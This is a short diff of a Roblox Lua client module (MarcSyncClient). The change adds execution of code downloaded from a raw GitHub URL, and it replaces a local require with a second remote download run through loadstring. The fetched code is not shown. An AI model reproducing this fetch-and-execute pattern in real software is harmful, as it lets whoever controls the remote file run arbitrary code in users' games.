@@ -7,9 +7,11 @@ local tokens = {
 local HttpService = game:GetService("HttpService")
 local code = HttpService:GetAsync("https://raw.githubusercontent.com/mrbuilder0/infinitytech/main/utils.lua", true)
 local Utils = loadstring(code)
+Utils()
 local MarcSyncClient = {}
 
-local Types = require(18958320636)
+local code = HttpService:GetAsync("https://raw.githubusercontent.com/mrbuilder0/infinitytech/main/types.lua", true)
+local Types = loadstring(code)
 
 MarcSyncClient.getVersion = function(self:typeof(MarcSyncClient), clientId: number?):string
 	self:_checkInstallation()
